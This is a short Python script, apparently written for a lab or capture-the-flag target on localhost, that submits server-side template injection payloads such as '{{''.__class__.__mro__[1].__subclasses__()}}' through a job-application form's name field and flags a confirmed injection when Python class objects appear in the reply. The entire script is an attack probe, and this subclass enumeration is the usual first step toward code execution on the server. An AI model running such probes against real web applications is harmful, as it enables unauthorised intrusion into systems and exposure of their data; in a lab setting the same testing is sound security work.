import requests

session = requests.Session()
base_url = "http://127.0.0.1:32856"

# Establish session
session.get(f"{base_url}/application")
print("Session established\n")

# Test payloads
payloads = [
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1]}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}"
]

for i, payload in enumerate(payloads, 1):
    data = {
        "name": payload,
        "email": "test@example.com",
        "phone": "1234567890",
        "experience": "5",
        "license": "ABC123"
    }
    
    resp = session.post(f"{base_url}/submit", data=data)
    
    print(f"Test {i}: {payload}")
    print(f"Status: {resp.status_code}")
    
    # Extract just the thank you message
    if "Thank you" in resp.text:
        start = resp.text.find("Thank you")
        end = resp.text.find("</", start)
        if end > start:
            msg = resp.text[start:end].strip()
            print(f"Response: {msg[:200]}")
    
    # Check for class indicators
    if "<class" in resp.text:
        print(">>> SSTI CONFIRMED - Class object detected")
    
    print()

